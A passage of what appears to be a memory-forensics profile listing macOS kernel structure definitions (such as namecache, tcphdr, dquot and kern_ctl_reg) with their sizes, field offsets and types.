}],
  '__unnamed_5434951': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsrv_uc_arg']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsrv_uc_arg']]]],
}],
  '__unnamed_6809248': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['LAG_s']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['LAG_s']]]],
}],
  '__unnamed_5434476': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsrv_sock']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsrv_sock']]]],
}],
  'namecache': [ 0x60, {
    'nc_entry': [0x0, ['__unnamed_17060066']],
    'nc_hash': [0x10, ['__unnamed_17060116']],
    'nc_child': [0x20, ['__unnamed_17060166']],
    'nc_un': [0x30, ['__unnamed_17060216']],
    'nc_dvp': [0x40, ['pointer', ['vnode']]],
    'nc_vp': [0x48, ['pointer', ['vnode']]],
    'nc_hashval': [0x50, ['BitField', {'end_bit': 32, 'start_bit': 1}]],
    'nc_whiteout': [0x50, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'nc_name': [0x58, ['pointer', ['char']]],
}],
  '__unnamed_13346481': [ 0x4, {
    'op': [0x0, ['unsigned char']],
    'bits': [0x1, ['unsigned char']],
    'val': [0x2, ['unsigned short']],
}],
  'ifnet_model_params': [ 0x10, {
    'model': [0x0, ['unsigned int']],
    'reserved': [0x4, ['array', 3, ['unsigned int']]],
}],
  'sastat': [ 0x28, {
    'spi': [0x0, ['unsigned int']],
    'created': [0x4, ['unsigned int']],
    'lft_c': [0x8, ['sadb_lifetime']],
}],
  'icmp': [ 0x1c, {
    'icmp_type': [0x0, ['unsigned char']],
    'icmp_code': [0x1, ['unsigned char']],
    'icmp_cksum': [0x2, ['unsigned short']],
    'icmp_hun': [0x4, ['__unnamed_8620573']],
    'icmp_dun': [0x8, ['__unnamed_8620683']],
}],
  'bpf_program': [ 0x10, {
    'bf_len': [0x0, ['unsigned int']],
    'bf_insns': [0x8, ['pointer', ['bpf_insn']]],
}],
  'wtab': [ 0x98, {
    'w_next': [0x0, ['pointer', ['wtab']]],
    'w_weight': [0x8, ['int']],
    'w_param_max': [0xc, ['int']],
    'w_refcount': [0x10, ['int']],
    'w_tab': [0x14, ['array', 32, ['int']]],
}],
  'mtx': [ 0x8, {
    'mtx_lock': [0x0, ['pointer', ['__unnamed_10745127']]],
}],
  '_ipfw_dyn_rule_32': [ 0x44, {
    'next': [0x0, ['unsigned int']],
    'rule': [0x4, ['unsigned int']],
    'parent': [0x8, ['unsigned int']],
    'pcnt': [0xc, ['unsigned long long']],
    'bcnt': [0x14, ['unsigned long long']],
    'id': [0x1c, ['ipfw_flow_id']],
    'expire': [0x2c, ['unsigned int']],
    'bucket': [0x30, ['unsigned int']],
    'state': [0x34, ['unsigned int']],
    'ack_fwd': [0x38, ['unsigned int']],
    'ack_rev': [0x3c, ['unsigned int']],
    'dyn_type': [0x40, ['unsigned short']],
    'count': [0x42, ['unsigned short']],
}],
  'memory_object_name_subsystem': [ 0x20, {
    'server': [0x0, ['pointer', ['void']]],
    'start': [0x8, ['int']],
    'end': [0xc, ['int']],
    'maxsize': [0x10, ['unsigned int']],
    'reserved': [0x18, ['unsigned long']],
    'routine': [0x20, ['array', 0, ['routine_descriptor']]],
}],
  'dtrace_hash': [ 0x30, {
    'dth_tab': [0x0, ['pointer', ['pointer', ['dtrace_hashbucket']]]],
    'dth_size': [0x8, ['int']],
    'dth_mask': [0xc, ['int']],
    'dth_nbuckets': [0x10, ['int']],
    'dth_nextoffs': [0x18, ['unsigned long']],
    'dth_prevoffs': [0x20, ['unsigned long']],
    'dth_stroffs': [0x28, ['unsigned long']],
}],
  'sem_trywait_args': [ 0x8, {
    'sem_l_': [0x0, ['array', 0, ['char']]],
    'sem': [0x0, ['unsigned long long']],
    'sem_r_': [0x8, ['array', 0, ['char']]],
}],
  'cat_fork': [ 0x60, {
    'cf_size': [0x0, ['long long']],
    'cf_new_size': [0x8, ['long long']],
    'cf_union': [0x10, ['__unnamed_10548639']],
    'cf_vblocks': [0x18, ['unsigned int']],
    'cf_blocks': [0x1c, ['unsigned int']],
    'cf_extents': [0x20, ['array', 8, ['HFSPlusExtentDescriptor']]],
}],
  '__unnamed_14931883': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'kern_ctl_reg': [ 0xa8, {
    'ctl_name': [0x0, ['array', 96, ['char']]],
    'ctl_id': [0x60, ['unsigned int']],
    'ctl_unit': [0x64, ['unsigned int']],
    'ctl_flags': [0x68, ['unsigned int']],
    'ctl_sendsize': [0x6c, ['unsigned int']],
    'ctl_recvsize': [0x70, ['unsigned int']],
    'ctl_connect': [0x78, ['pointer', ['void']]],
    'ctl_disconnect': [0x80, ['pointer', ['void']]],
    'ctl_send': [0x88, ['pointer', ['void']]],
    'ctl_setopt': [0x90, ['pointer', ['void']]],
    'ctl_getopt': [0x98, ['pointer', ['void']]],
    'ctl_rcvd': [0xa0, ['pointer', ['void']]],
}],
  'psynch_rw_rdlock_args': [ 0x28, {
    'rwlock': [0x0, ['unsigned long long']],
    'rwlock_l_': [0x0, ['array', 0, ['char']]],
    'lgenval': [0x8, ['unsigned int']],
    'lgenval_l_': [0x8, ['array', 0, ['char']]],
    'rwlock_r_': [0x8, ['array', 0, ['char']]],
    'lgenval_r_': [0xc, ['array', 4, ['char']]],
    'ugenval': [0x10, ['unsigned int']],
    'ugenval_l_': [0x10, ['array', 0, ['char']]],
    'ugenval_r_': [0x14, ['array', 4, ['char']]],
    'rw_wc': [0x18, ['unsigned int']],
    'rw_wc_l_': [0x18, ['array', 0, ['char']]],
    'rw_wc_r_': [0x1c, ['array', 4, ['char']]],
    'flags': [0x20, ['int']],
    'flags_l_': [0x20, ['array', 0, ['char']]],
    'flags_r_': [0x24, ['array', 4, ['char']]],
}],
  'snprintf_arg': [ 0x10, {
    'str': [0x0, ['pointer', ['char']]],
    'remain': [0x8, ['unsigned long']],
}],
  'ip6aux': [ 0xc, {
    'ip6a_flags': [0x0, ['unsigned int']],
    'ip6a_ehsrc': [0x4, ['array', 6, ['unsigned char']]],
}],
  'purgeable_q': [ 0x98, {
    'token_q_head': [0x0, ['unsigned int']],
    'token_q_tail': [0x4, ['unsigned int']],
    'token_q_unripe': [0x8, ['unsigned int']],
    'new_pages': [0xc, ['int']],
    'objq': [0x10, ['array', 8, ['queue_entry']]],
    'type': [0x90, ['Enumeration', {'target': 'int', 'choices': {0: 'PURGEABLE_Q_TYPE_OBSOLETE', 1: 'PURGEABLE_Q_TYPE_FIFO', 2: 'PURGEABLE_Q_TYPE_LIFO', 3: 'PURGEABLE_Q_TYPE_MAX'}}]],
}],
  '__unnamed_12515317': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['tcpcb']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['tcpcb']]]],
}],
  'rb_head': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['vm_map_store']]],
}],
  'user32_statfs': [ 0x110, {
    'f_otype': [0x0, ['short']],
    'f_oflags': [0x2, ['short']],
    'f_bsize': [0x4, ['int']],
    'f_iosize': [0x8, ['int']],
    'f_blocks': [0xc, ['int']],
    'f_bfree': [0x10, ['int']],
    'f_bavail': [0x14, ['int']],
    'f_files': [0x18, ['int']],
    'f_ffree': [0x1c, ['int']],
    'f_fsid': [0x20, ['fsid']],
    'f_owner': [0x28, ['unsigned int']],
    'f_reserved1': [0x2c, ['short']],
    'f_type': [0x2e, ['short']],
    'f_flags': [0x30, ['int']],
    'f_reserved2': [0x34, ['array', 2, ['int']]],
    'f_fstypename': [0x3c, ['array', 15, ['char']]],
    'f_mntonname': [0x4b, ['array', 90, ['char']]],
    'f_mntfromname': [0xa5, ['array', 90, ['char']]],
    'f_reserved3': [0xff, ['char']],
    'f_reserved4': [0x100, ['array', 4, ['int']]],
}],
  'dof_helper': [ 0x50, {
    'dofhp_mod': [0x0, ['array', 64, ['char']]],
    'dofhp_addr': [0x40, ['unsigned long long']],
    'dofhp_dof': [0x48, ['unsigned long long']],
}],
  'cpu_desc_table64': [ 0x11a0, {
    'gdt': [0x0, ['array', 19, ['fake_descriptor']]],
    'ktss': [0xa0, ['x86_64_tss']],
    'sstk': [0x110, ['sysenter_stack']],
    'fstk': [0x1a0, ['array', 4096, ['unsigned char']]],
}],
  'ih_pmtu': [ 0x4, {
    'ipm_void': [0x0, ['unsigned short']],
    'ipm_nextmtu': [0x2, ['unsigned short']],
}],
  'PingMsg': [ 0x7c, {
    'msgHdr': [0x0, ['__unnamed_15755061']],
    'msgBody': [0x20, ['__unnamed_15756559']],
    'ports': [0x24, ['array', 1, ['__unnamed_15756615']]],
    'notifyHeader': [0x34, ['OSNotificationHeader64']],
}],
  'pfloghdr': [ 0x40, {
    'length': [0x0, ['unsigned char']],
    'af': [0x1, ['unsigned char']],
    'action': [0x2, ['unsigned char']],
    'reason': [0x3, ['unsigned char']],
    'ifname': [0x4, ['array', 16, ['char']]],
    'ruleset': [0x14, ['array', 16, ['char']]],
    'rulenr': [0x24, ['unsigned int']],
    'subrulenr': [0x28, ['unsigned int']],
    'uid': [0x2c, ['unsigned int']],
    'pid': [0x30, ['int']],
    'rule_uid': [0x34, ['unsigned int']],
    'rule_pid': [0x38, ['int']],
    'dir': [0x3c, ['unsigned char']],
    'pad': [0x3d, ['array', 3, ['unsigned char']]],
}],
  'HFSPlusAttrForkData': [ 0x58, {
    'recordType': [0x0, ['unsigned int']],
    'reserved': [0x4, ['unsigned int']],
    'theFork': [0x8, ['HFSPlusForkData']],
}],
  'ifnet_demux_desc': [ 0x18, {
    'type': [0x0, ['unsigned int']],
    'data': [0x8, ['pointer', ['void']]],
    'datalen': [0x10, ['unsigned int']],
}],
  'pfioc_src_nodes_64': [ 0x10, {
    'psn_len': [0x0, ['int']],
    'psn_u': [0x8, ['__unnamed_7469171']],
}],
  'nfsiodmountlist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfsmount']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfsmount']]]],
}],
  '__unnamed_12616586': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['domain']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['domain']]]],
}],
  'mac_policy_list': [ 0x20, {
    'numloaded': [0x0, ['unsigned int']],
    'max': [0x4, ['unsigned int']],
    'maxindex': [0x8, ['unsigned int']],
    'staticmax': [0xc, ['unsigned int']],
    'chunks': [0x10, ['unsigned int']],
    'freehint': [0x14, ['unsigned int']],
    'entries': [0x18, ['pointer', ['mac_policy_list_element']]],
}],
  'sem_wait_args': [ 0x8, {
    'sem_l_': [0x0, ['array', 0, ['char']]],
    'sem': [0x0, ['unsigned long long']],
    'sem_r_': [0x8, ['array', 0, ['char']]],
}],
  'vn_ioctl_64': [ 0x10, {
    'vn_file': [0x0, ['unsigned long long']],
    'vn_size': [0x8, ['int']],
    'vn_control': [0xc, ['Enumeration', {'target': 'int', 'choices': {0: 'vncontrol_readwrite_io_e'}}]],
}],
  'proto_input_entry': [ 0x60, {
    'next': [0x0, ['pointer', ['proto_input_entry']]],
    'detach': [0x8, ['int']],
    'domain': [0x10, ['pointer', ['domain']]],
    'hash': [0x18, ['int']],
    'chain': [0x1c, ['int']],
    'protocol': [0x20, ['unsigned int']],
    'input': [0x28, ['pointer', ['void']]],
    'detached': [0x30, ['pointer', ['void']]],
    'inject_first': [0x38, ['pointer', ['mbuf']]],
    'inject_last': [0x40, ['pointer', ['mbuf']]],
    'input_next': [0x48, ['pointer', ['proto_input_entry']]],
    'input_first': [0x50, ['pointer', ['mbuf']]],
    'input_last': [0x58, ['pointer', ['mbuf']]],
}],
  'processor_sched_statistics': [ 0x28, {
    'csw_count': [0x0, ['unsigned int']],
    'preempt_count': [0x4, ['unsigned int']],
    'preempted_rt_count': [0x8, ['unsigned int']],
    'preempted_by_rt_count': [0xc, ['unsigned int']],
    'rt_sched_count': [0x10, ['unsigned int']],
    'interrupt_count': [0x14, ['unsigned int']],
    'ipi_count': [0x18, ['unsigned int']],
    'timer_pop_count': [0x1c, ['unsigned int']],
    'idle_transitions': [0x20, ['unsigned int']],
    'quantum_timer_expirations': [0x24, ['unsigned int']],
}],
  'ifnet_log_params': [ 0x10, {
    'level': [0x0, ['int']],
    'flags': [0x4, ['unsigned int']],
    'category': [0x8, ['int']],
    'subcategory': [0xc, ['int']],
}],
  'vm_speculative_age_q': [ 0x18, {
    'age_q': [0x0, ['queue_entry']],
    'age_ts': [0x10, ['mach_timespec']],
}],
  'bs_map': [ 0x10, {
    'vp': [0x0, ['pointer', ['vnode']]],
    'bs': [0x8, ['pointer', ['void']]],
}],
  'mkfifo_args': [ 0x10, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'mode_l_': [0x8, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'mode': [0x8, ['int']],
    'mode_r_': [0xc, ['array', 4, ['char']]],
}],
  'utun_crypto_framer_ipsec_state': [ 0x4, {
    'unused': [0x0, ['unsigned int']],
}],
  'dquot': [ 0x80, {
    'dq_hash': [0x0, ['__unnamed_10547256']],
    'dq_freelist': [0x10, ['__unnamed_10547310']],
    'dq_flags': [0x20, ['unsigned short']],
    'dq_cnt_unused': [0x22, ['unsigned short']],
    'dq_lflags': [0x24, ['unsigned short']],
    'dq_type': [0x26, ['unsigned short']],
    'dq_id': [0x28, ['unsigned int']],
    'dq_index': [0x2c, ['unsigned int']],
    'dq_qfile': [0x30, ['pointer', ['quotafile']]],
    'dq_dqb': [0x38, ['dqblk']],
    'dq_cnt': [0x78, ['unsigned int']],
}],
  'mk_timer': [ 0x88, {
    'lock': [0x0, ['slock']],
    'call_entry': [0x8, ['thread_call']],
    'is_dead': [0x78, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'is_armed': [0x78, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'active': [0x7c, ['int']],
    'port': [0x80, ['pointer', ['ipc_port']]],
}],
  'tcphdr': [ 0x14, {
    'th_sport': [0x0, ['unsigned short']],
    'th_dport': [0x2, ['unsigned short']],
    'th_seq': [0x4, ['unsigned int']],
    'th_ack': [0x8, ['unsigned int']],
    'th_x2': [0xc, ['BitField', {'end_bit': 4, 'start_bit': 0}]],
    'th_off': [0xc, ['BitField', {'end_bit': 8, 'start_bit': 4}]],
    'th_flags': [0xd, ['unsigned char']],
    'th_win': [0xe, ['unsigned short']],
    'th_sum': [0x10, ['unsigned short']],
    'th_urp': [0x12, ['unsigned short']],
}],
  'bufhashhdr': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['buf']]],
}],
  'dqblk': [ 0x40, {
    'dqb_bhardlimit': [0x0, ['unsigned long long']],
    'dqb_bsoftlimit': [0x8, ['unsigned long long']],
    'dqb_curbytes': [0x10, ['unsigned long long']],
    'dqb_ihardlimit': [0x18, ['unsigned int']],
    'dqb_isoftlimit': [0x1c, ['unsigned int']],
    'dqb_curinodes': [0x20, ['unsigned int']],
    'dqb_btime': [0x24, ['unsigned int']],
    'dqb_itime': [0x28, ['unsigned int']],
    'dqb_id': [0x2c, ['unsigned int']],
    'dqb_spare': [0x30, ['array', 4, ['unsigned int']]],
}],
  'utun_crypto_keys_ipsec_args_v1': [ 0x144, {
    'src_addr': [0x0, ['sockaddr_storage']],
    'dst_addr': [0x80, ['sockaddr_storage']],
    'proto': [0x100, ['Enumeration', {'target': 'int', 'choices': {0: 'IF_UTUN_CRYPTO_IPSEC_PROTO_NONE', 1: 'IF_UTUN_CRYPTO_IPSEC_PROTO_ESP', 2: 'IF_UTUN_CRYPTO_IPSEC_PROTO_AH', 3: 'IF_UTUN_CRYPTO_IPSEC_PROTO_MAX'}}]],
